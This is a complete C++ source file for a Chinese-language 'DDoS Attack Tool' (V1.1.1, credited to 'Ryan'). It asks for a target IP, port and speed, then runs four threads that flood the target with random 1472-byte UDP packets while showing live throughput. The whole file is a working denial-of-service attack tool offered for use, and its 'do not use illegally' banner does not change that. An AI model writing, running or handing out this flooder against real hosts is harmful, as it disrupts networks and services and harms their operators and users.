#include <iostream>
#include <thread>
#include <vector>
#include <atomic>
#include <chrono>
#include <iomanip>
#include <sstream>
#include <string>
#include <cstdlib>
#include <ctime>
#include <cstring>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <fcntl.h>

using namespace std;

// 配置参数
const size_t PAYLOAD_SIZE = 1472;
const int THREAD_NUM = 4;
atomic<bool> running(true);
atomic<uint64_t> total_sent(0);

// 终端颜色宏
#define RESET   "\033[0m"
#define RED     "\033[31m"
#define GREEN   "\033[32m"
#define YELLOW  "\033[33m"
#define BLUE    "\033[34m"
#define CYAN    "\033[36m"

// 清屏函数
void clear_screen() {
#ifdef _WIN32
    system("cls");
#else
    system("clear");
#endif
}

// 生成随机 payload
vector<char> generate_payload() {
    vector<char> payload(PAYLOAD_SIZE);
    for (size_t i = 0; i < PAYLOAD_SIZE; ++i) {
        payload[i] = rand() % 256;
    }
    return payload;
}

// 验证 IP 格式
bool validate_ip(const string& ip_str) {
    struct sockaddr_in sa;
    return inet_pton(AF_INET, ip_str.c_str(), &(sa.sin_addr)) != 0;
}

// 发送线程函数
void send_worker(const string& target_ip, int target_port, double delay) {
    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        perror("Socket 创建失败");
        return;
    }

    // 设置非阻塞（可选，视需求而定）
    // fcntl(sockfd, F_SETFL, O_NONBLOCK);

    struct sockaddr_in target_addr{};
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(target_port);
    inet_pton(AF_INET, target_ip.c_str(), &target_addr.sin_addr);

    auto payload = generate_payload();

    while (running) {
        ssize_t sent = sendto(sockfd, payload.data(), payload.size(), 0,
                              (struct sockaddr*)&target_addr, sizeof(target_addr));
        if (sent > 0) {
            total_sent++;
        }

        if (delay > 0) {
            usleep(static_cast<unsigned int>(delay * 1000000));
        }
    }
    close(sockfd);
}

// 打印启动界面 (模仿 Python 版 UI)
void print_banner() {
    // 尝试调用 figlet，如果失败则打印普通文本
    int figlet_result = system("figlet DDoS Attack");

    if (figlet_result != 0) {
        cout << GREEN << "DDoS Attack Tool (Figlet not installed)" << RESET << endl;
    }

    cout << endl;
    cout << GREEN << "/------------------------------------------\\ " << RESET << endl;
    cout << GREEN << "|  " << RESET << "作者" << GREEN << "          : Ryan" << string(32, ' ') << GREEN << " |" << RESET << endl;
    cout << GREEN << "|  " << RESET << "版本" << GREEN << "          : V1.1.1" << string(30, ' ') << GREEN << " |" << RESET << endl;
    cout << GREEN << "\\------------------------------------------/ " << RESET << endl;
    cout << endl;
    cout << YELLOW << " ----------------[请勿用于违法用途]---------------- " << RESET << endl;
    cout << endl;
}

int main() {
    srand(time(nullptr));
    string target_ip;
    int target_port;
    int speed;

    // 1. 显示当前时间 (模仿 Python 版)
    time_t now = time(0);
    char* dt = ctime(&now);
    cout << "当前时间: " << dt << endl;

    // 2. 清屏 + 打印 banner
    usleep(2000000); // 暂停2秒让用户看时间，然后清屏
    clear_screen();
    print_banner();

    // 3. 用户输入 (UI 文本完全同步 Python 版)

    // IP 输入
    while (true) {
        cout << "请输入目标 IP 地址: "; // Python: "请输入目标 IP 地址："
        cin >> target_ip;
        if (validate_ip(target_ip)) break;
        cout << "[!] 无效 IP 地址，请重新输入！" << endl;
    }

    // 端口输入
    while (true) {
        cout << "请输入目标端口: "; // Python: "请输入目标端口："
        if ((cin >> target_port) && target_port >= 1 && target_port <= 65535) {
            break;
        } else {
            cout << "[!] 端口范围应为 1~65535" << endl;
            cin.clear();
            cin.ignore(1024, '\n');
        }
    }

    // 速度输入
    while (true) {
        cout << "攻击速度 (1~1000): "; // Python: "攻击速度 (1~1000) ："
        if ((cin >> speed) && speed >= 1 && speed <= 1000) {
            break;
        } else {
            cout << "[!] 速度值必须在 1~1000 之间" << endl;
            cin.clear();
            cin.ignore(1024, '\n');
        }
    }

    double delay = (1000.0 - speed) / 2000.0;

    // 4. 攻击前准备
    clear_screen();
    cout << GREEN << "[+] 开始向 " << target_ip << ":" << target_port << " 发送 UDP Flood 攻击..." << RESET << endl;
    cout << GREEN << "[+] 按 Ctrl+C 可随时中止" << RESET << endl;
    cout << string(50, '-') << endl;

    // 5. 启动多线程
    vector<thread> threads;
    for (int i = 0; i < THREAD_NUM; ++i) {
        threads.emplace_back(send_worker, target_ip, target_port, delay);
    }

    // 6. 实时统计循环
    uint64_t last_count = 0;
    try {
        while (running) {
            uint64_t current = total_sent.load();
            uint64_t diff = current - last_count;
            last_count = current;

            // 计算流量 (MB/s)
            double mbps = (diff * PAYLOAD_SIZE) / (1024.0 * 1024.0);

            // 单行刷新显示
            cout << "\r" << CYAN << "已发送 " << current << " 个数据包 | 实时流量: "
                 << fixed << setprecision(2) << mbps << " MB/s      " << RESET << flush;

            this_thread::sleep_for(chrono::seconds(1));
        }
    } catch (...) {
        // 捕获 Ctrl+C
    }

    // 7. 退出处理
    running = false;
    for (auto& t : threads) {
        if (t.joinable()) t.join();
    }

    cout << "\n\n" << GREEN << "[!] 攻击已中止。" << RESET << endl;
    cout << GREEN << "[i] 总共发送了 " << total_sent.load() << " 个 UDP 数据包。" << RESET << endl;

    return 0;
}
